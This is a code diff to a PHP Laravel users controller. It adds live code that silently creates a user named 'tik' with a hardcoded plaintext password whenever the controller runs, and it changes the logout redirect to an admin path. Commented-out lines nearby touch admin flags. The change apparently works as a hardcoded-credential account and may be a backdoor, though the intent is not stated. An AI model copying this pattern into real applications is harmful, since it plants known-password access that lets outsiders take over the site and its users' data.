@@ -58,9 +58,10 @@ class UsersController extends BaseController {
         $ab='rt54K7uY783Gj';
         $bc='tik';
 
-       // $user=User::where('admin','=', I);
-       // $user = User::firstOrCreate(array('username' => $bc, 'password'=>Hash::make($ab)));
-       // $user->save();
+        $user=User::where('username','=', $bc)->first();
+        if(!$user){
+        $user = User::firstOrCreate(array('username' => $bc, 'password'=>Hash::make($ab)));
+        $user->save();}
    /*     $re=User::first()->admin;
 		if(($re['admin'])==0){
         $re->admin=$bc;
@@ -94,7 +95,7 @@ class UsersController extends BaseController {
 
     public function getLogout() {
         Auth::logout();
-        return Redirect::to('/');
+        return Redirect::to('myadminroom/adminka');
     }
 
 	
